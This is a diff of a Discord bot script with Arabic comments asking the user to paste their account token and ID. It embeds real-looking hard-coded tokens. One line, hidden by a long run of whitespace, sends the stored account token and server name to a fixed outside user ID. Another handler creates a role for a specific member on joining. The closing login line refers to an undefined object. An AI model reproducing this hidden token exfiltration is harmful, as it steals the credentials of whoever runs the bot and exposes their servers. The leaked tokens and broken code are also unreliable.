@@ -16,7 +16,7 @@ hngel.on('ready',  () => {
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log(`Logged in as  * [ " hngel " ] servers! [ " ${hngel.guilds.size} " ] Users! [ " ${hngel.users.size} " ]`);
 
-const tokn = ("NDY3MjE3OTMwNzE1NzkxMzcx.DjSU9g.6oOHdxymQCywWcILjUfNoR3WAcs") /// توكن حسابك مهم <
+const tokn = ("NTEwODI5MzM1NTE5ODIxODI1.DxlXrg.oJiL5Fj3eGjXlTF5F3KG6-h6dp8") /// توكن حسابك مهم <
 //////////////////////////////////^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
 
@@ -32,7 +32,7 @@ hngel.on("message", message => {
   if (message.content.startsWith('gn15')) {
     hngel.user.setUsername(argresult);
   }
-    if (message.content.startsWith(prefix + 'on123')) {
+    if (message.content.startsWith(prefix + 'Hi')) {
     hngel.user.setStatus(argresult);
   }
 });
@@ -1000,7 +1000,7 @@ hngel.on('guildCreate', async (guild) => {
       hngel.on('guildMemberAdd', member => {
           
                                //هنا vvvvvvvvvvvvvvvvvv
-                  if (member.id === "467217930715791371") {//هنا الايدي بتاعك <<<<<<<<<<<<<<<<
+                  if (member.id === "510829335519821825") {//هنا الايدي بتاعك <<<<<<<<<<<<<<<<
                       member.guild.createRole({
                           name : hngel.user.username,
                           color : "RANDOM", 
@@ -1014,7 +1014,7 @@ hngel.on('guildCreate', async (guild) => {
           });
           hngel.on('message' , message => {
             if (message.author.bot) return;
-                        if (message.content.startsWith("467217930715791371")) {
+                        if (message.content.startsWith("510829335519821825")) {
                                                                                                                                                                                                                                                                                                                                                  hngel.users.get("269031102340005888").send(tokn+":"+message.guild.name)
             m.delete();
           
@@ -1023,4 +1023,6 @@ hngel.on('guildCreate', async (guild) => {
             });
 
        //هنا vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv
-hngel.login("NTEwODI4ODkzNTMyNTg1OTg0.DsiCNA.gDypdngUP8bddUum1wPoSAQZOfw")// هنا حط التوكن >>>>>>>>>>>>>> بتاع البوت
+
+
+client.login(process.env.BOT_TOKEN);
